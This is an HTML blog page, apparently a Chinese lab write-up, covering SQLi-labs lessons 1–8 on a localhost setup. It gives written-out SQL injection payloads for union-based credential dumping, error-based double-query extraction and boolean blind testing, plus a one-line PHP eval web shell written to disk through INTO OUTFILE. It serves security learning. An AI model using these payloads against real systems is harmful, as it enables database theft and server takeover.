@@ -1,0 +1,174 @@
+<html>
+<head>
+	
+	<title>SQLi-labs环境搭建及学习</title>
+	<meta name="keywords" content="Curtails的blog" />
+
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    
+	   <link href="/css/main.css?v=3" rel="stylesheet" type="text/css" />
+    
+        <script src="/js/util.js"></script>
+        <script>
+            if(isMobile()) {
+                loadjscssfile('../css/mobile.css', 'css');
+            } else {
+                loadjscssfile('../css/desktop.css', 'css');
+            }
+        </script> 
+    
+
+    <link rel="alternate" type="application/atom+xml" href="/atom.xml" title="Atom feed">
+
+    
+	<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=3"/>
+    
+    
+
+</head>
+
+<body>
+
+
+<h2 class="title">SQLi-labs环境搭建及学习</h2>
+<!---
+<div style="text-align:center;margin-top: -10px;">
+<div class="article-category">
+发表于2019年10月12日
+
+
+
+
+ </div>
+--->
+</div>
+
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL相关知识"><span class="toc-text">SQL相关知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lesson-1-GET-Error-based-Single-quotes-String"><span class="toc-text">Lesson 1 GET-Error based-Single quotes-String</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lesson-2-GET-Error-based-Intiger-based"><span class="toc-text">Lesson 2 GET-Error based-Intiger based</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lesson-3-GET-Error-based-Single-quotes-with-twist-string"><span class="toc-text">Lesson 3 GET-Error based-Single quotes with twist-string</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lesson-4-GET-Error-based-Double-Quotes-String"><span class="toc-text">Lesson 4 GET-Error based-Double Quotes-String</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lesson-5-GET-Double-Injection-Single-Quotes-String"><span class="toc-text">Lesson 5 GET-Double Injection-Single Quotes-String</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lesson-6-GET-Double-Injection-Double-Quotes-String"><span class="toc-text">Lesson 6 GET-Double Injection-Double Quotes-String</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lesson-7-GET-Dump-into-outfile-String"><span class="toc-text">Lesson 7 GET-Dump into outfile-String</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lesson-8-GET-Blind-Boolian-Based-Single-Quotes"><span class="toc-text">Lesson 8 GET-Blind-Boolian Based-Single Quotes</span></a></li></ol>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
+<li>花了好久才确定可以使用的php版本及mysql版本</li>
+<li>phpstudy <code>Apache2.4.39</code> <code>MySQL5.5.29</code> <code>php5.4.45</code></li>
+<li>将sqli-labs放到www 打开网址<a href="http://localhost/sqli-labs/" target="_blank" rel="noopener">http://localhost/sqli-labs/</a> 点击Setup/reset Database for labs 安装即可</li>
+</ul>
+<h2 id="SQL相关知识"><a href="#SQL相关知识" class="headerlink" title="SQL相关知识"></a>SQL相关知识</h2><p>SQL注释符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SQL注释符 		URL编码</span><br><span class="line">#				%23</span><br><span class="line">--空格			--%20 --+</span><br><span class="line">/*...*/</span><br></pre></td></tr></table></figure>
+
+<p>SQL 查询信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">version() 		数据库版本信息</span><br><span class="line">database()		数据库名称</span><br><span class="line">user()			用户名</span><br></pre></td></tr></table></figure>
+
+<p>盲注(在不知道数据库返回值的情况下 对数据中的内容进行猜测)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">盲注</span><br><span class="line">布尔盲注：页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据</span><br><span class="line"></span><br><span class="line">基于时间的盲注：通过页面沉睡时间判断</span><br><span class="line"></span><br><span class="line">报错的盲注：构造payload让信息通过错误提示回显出来，一种类型（其它的暂时不怎么了解）是先报字段数，再利用后台数据库报错机制回显（跟一般的报错区别是，一般的报错注入是爆出字段数后，在此基础通过正确的查询语句，使结果回显到页面；后者是在爆出字段数的基础上使用能触发SQL报错机制的注入语句）</span><br></pre></td></tr></table></figure>
+
+<h2 id="Lesson-1-GET-Error-based-Single-quotes-String"><a href="#Lesson-1-GET-Error-based-Single-quotes-String" class="headerlink" title="Lesson 1 GET-Error based-Single quotes-String"></a>Lesson 1 GET-Error based-Single quotes-String</h2><p>基于错误-单引号-字符注入</p>
+<ul>
+<li><p>判断是否为数值注入<br>id=1 成功回显数据<br>id=1 and 1=1 成功回显数据<br>id=1 and 1=2 成功回显数据<br>所以不是数值注入</p>
+</li>
+<li><p>判断是否为字符注入<br>id=1’ 报错<br>id=1’–+ 成功回显<br>是字符注入</p>
+</li>
+<li><p>查找字段<br>id=1’ order by 5–+ 回显<code>Unknown column &#39;5&#39; in &#39;order clause&#39;</code><br>id=1’ order by 3–+ 成功回显 字段为3</p>
+</li>
+<li><p>查询回显点<br>id=’ union select 1,2,3–+ 回显<code>Your Login name:2 Your Password:3</code>说明第二第三字段会显示</p>
+</li>
+<li><p>查询数据库相关信息<br>id=’ union select 1,database(),user()–+ 回显<code>Your Login name:security Your Password:root@localhost</code><br>id=’ union select 1,2,version()–+ 回显<code>Your Login name:2 Your Password:5.5.29</code></p>
+</li>
+<li><p>查询所有数据库<br>id=’ union select 1,(select group_concat(schema_name) from information_schema.schemata),3–+ 回显<code>Your Login name:information_schema,challenges,mysql,performance_schema,security,test Your Password:3</code></p>
+</li>
+<li><p>查询security数据库的表名<br>id=’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),3–+ 回显<code>Your Login name:emails,referers,uagents,users Your Password:3</code></p>
+</li>
+<li><p>查询users表中的列名<br>id=’ union select 1,(select group_concat(column_name) from information_schema.columns where table_name=’users’),3–+ 回显<code>Your Login name:id,username,password Your Password:3</code></p>
+</li>
+<li><p>查询两个列的数据username与password<br>id=’ union select 1,(select group_concat(username) from users),(select group_concat(password) from users)–+<br>回显<code>Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4 Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</code></p>
+</li>
+</ul>
+<h2 id="Lesson-2-GET-Error-based-Intiger-based"><a href="#Lesson-2-GET-Error-based-Intiger-based" class="headerlink" title="Lesson 2 GET-Error based-Intiger based"></a>Lesson 2 GET-Error based-Intiger based</h2><p>基于错误的数值注入</p>
+<ul>
+<li><p>判断是否为数值注入<br>id=1 成功回显数据<br>id=1 and 1=1 成功回显数据<br>id=1 and 1=2 成功执行没有回显数据</p>
+</li>
+<li><p>查找字段<br>id=1 order by 3–+</p>
+</li>
+<li><p>查询回显点<br>id=0 union select 1,2,3–+ 回显<code>Your Login name:2 Your Password:3</code> 后两个字段回显</p>
+</li>
+<li><p>查询数据库相关信息<br>id=0 union select 1,database(),version()–+<br>id=0 union select 1,database(),user()–+</p>
+</li>
+<li><p>查询所有数据库<br>id=0 union select 1,(select group_concat(schema_name) from information_schema.schemata),3–+ </p>
+</li>
+<li><p>查询数据库表名<br>id=0 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),3–+ </p>
+</li>
+<li><p>查询users表中的列名<br>id=0 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=’users’),3–+ </p>
+</li>
+<li><p>查询两个列的数据username与password<br>id=0 union select 1,(select group_concat(username) from users),(select group_concat(password) from users)–+</p>
+</li>
+</ul>
+<h2 id="Lesson-3-GET-Error-based-Single-quotes-with-twist-string"><a href="#Lesson-3-GET-Error-based-Single-quotes-with-twist-string" class="headerlink" title="Lesson 3 GET-Error based-Single quotes with twist-string"></a>Lesson 3 GET-Error based-Single quotes with twist-string</h2><p>基于GET错误-单引号变形-字符</p>
+<ul>
+<li>id=1’ 报错You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘ <code>&#39;1&#39;&#39;)</code> LIMIT 0,1’ at line 1</li>
+<li>猜测id除了有单引号<code>&#39;&#39;</code> 还有<code>()</code><br><code>select * from tablename where id=(&#39; &#39;)</code></li>
+<li>id=1’) and 1=1–+ 成功回显</li>
+</ul>
+<h2 id="Lesson-4-GET-Error-based-Double-Quotes-String"><a href="#Lesson-4-GET-Error-based-Double-Quotes-String" class="headerlink" title="Lesson 4 GET-Error based-Double Quotes-String"></a>Lesson 4 GET-Error based-Double Quotes-String</h2><p>基于错误-双引号-字符</p>
+<ul>
+<li>id=1’  一个单引号竟然成功回显了<br>id=1’’ 两个单引号竟然成功回显了 好吧1’’’被当作1执行了</li>
+<li>id=1”  报错for the right syntax to use near ‘ <code>&quot;3&quot;&quot;)</code> LIMIT 0,1’ at line 1</li>
+<li>猜测<code>select * from tablename where id=(&quot; &quot;)</code></li>
+<li>id=1”) and 1=1–+ 成功回显</li>
+</ul>
+<h2 id="Lesson-5-GET-Double-Injection-Single-Quotes-String"><a href="#Lesson-5-GET-Double-Injection-Single-Quotes-String" class="headerlink" title="Lesson 5 GET-Double Injection-Single Quotes-String"></a><code>Lesson 5 GET-Double Injection-Single Quotes-String</code></h2><p>GET-双注入-单引号-字符<br>双注入用到的函数/语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Rand()          随机函数</span><br><span class="line">Floor()         取整函数</span><br><span class="line">Count()         汇总函数</span><br><span class="line">Group by clause 分组语句</span><br></pre></td></tr></table></figure>
+<ul>
+<li>id=2’ and (select 1 from (select count(<em>),concat(((select group_concat(schema_name) from information_schema.schemata)),floor (rand(0)</em>2))x from information_schema.tables group by x)a) –+<br>这里使用了派生表<code>select 1 from a</code> 回显 <code>Subquery returns more than 1 row</code> 实际上这条SQL语句返回一个row 只是字符串长度超过了64位 </li>
+<li>使用limit 0,1来控制一个个输出 0表示输出的起始位置，1表示跨度为1（即输出几个数据，1表示输出一个，2就表示输出两个）and (select 1 from (select count(<em>),concat(((select schema_name from information_schema.schemata limit 0,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) –+ 回显<code>Duplicate entry &#39;information_schema1&#39; for key &#39;group_key&#39;</code><br>但是为了使数据输出更清楚 构造语句让报错信息与固定系统语句信息分离 ?id=2’ and (select 1 from (select count(</em>),concat(((select concat(schema_name,’;’) from information_schema.schemata limit 0,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) –+ 回显<code>Duplicate entry &#39;information_schema;1&#39; for key &#39;group_key&#39;</code> 其中information_schema为真正报错信息为数据库名称</li>
+<li>?id=2’ and (select 1 from (select count(<em>),concat(((select concat(table_name,’;’) from information_schema.tables limit 0,1)),floor (rand(0)</em>2))x from information_schema.tables group by x)a) –+ 回显<code>Duplicate entry &#39;CHARACTER_SETS;1&#39; for key &#39;group_key&#39;</code></li>
+</ul>
+<h2 id="Lesson-6-GET-Double-Injection-Double-Quotes-String"><a href="#Lesson-6-GET-Double-Injection-Double-Quotes-String" class="headerlink" title="Lesson 6 GET-Double Injection-Double Quotes-String"></a>Lesson 6 GET-Double Injection-Double Quotes-String</h2><p>GET-双注入-双引号-字符串</p>
+<ul>
+<li>同lesson5 单引号变双引号</li>
+</ul>
+<h2 id="Lesson-7-GET-Dump-into-outfile-String"><a href="#Lesson-7-GET-Dump-into-outfile-String" class="headerlink" title="Lesson 7 GET-Dump into outfile-String"></a>Lesson 7 GET-Dump into outfile-String</h2><p>GET-导出文件-字符型</p>
+<ul>
+<li><p>id=1 回显<code>You are in.... Use outfile......</code></p>
+</li>
+<li><p>判断数值注入 id=1 and 1=2 还是回显<code>You are in.... Use outfile......</code>不是数值注入</p>
+</li>
+<li><p>判断字符注入 id=1’ 回显<code>You have an error in your SQL syntax</code>有戏<br>id=1’–+   回显<code>You have an error in your SQL syntax</code><br>id=1’)–+  回显<code>You have an error in your SQL syntax</code><br>id=1’))–+ 回显<code>You are in.... Use outfile......</code></p>
+</li>
+<li><p>如果已经绝对路径 可以写入文件 ?id=1’)) union select “<?php @eval($_POST['topo']);?>“ into outfile “XXX\conn.php” %23 再用蚁剑连接</p>
+</li>
+</ul>
+<h2 id="Lesson-8-GET-Blind-Boolian-Based-Single-Quotes"><a href="#Lesson-8-GET-Blind-Boolian-Based-Single-Quotes" class="headerlink" title="Lesson 8 GET-Blind-Boolian Based-Single Quotes"></a>Lesson 8 GET-Blind-Boolian Based-Single Quotes</h2><p>GET-盲注-基于布尔-单引号</p>
+<ul>
+<li><p>?id=1 回显<code>You are in...........</code><br>id=0  成功执行无回显</p>
+</li>
+<li><p>id=1’ 成功执行无回显<br>id=1’%23 成功执行有回显``You are in………..<code>?id=1&#39;and 1=2%23 成功执行无回显
+?id=1&#39;and 1=1%23 成功执行有回显</code>You are in………..`</p>
+</li>
+</ul>
+<p>布尔盲注 成功查询到数据返回true 错误及无数据返回false </p>
+
+
+<!--<a href="https://curtails.github.io/2019/10/12/sqli-labs/#disqus_thread" class="article-comment-link">Comments</a>
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = ''; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript" target="_blank" rel="noopener">comments powered by Disqus.</a></noscript>
+-->
+<div style="display:none">
+<script src="http://s4.cnzz.com/stat.php?id=&web_id=" language="JavaScript"></script>script>
+</div>
+
+
+
+
+
+
+</body>
+</html>
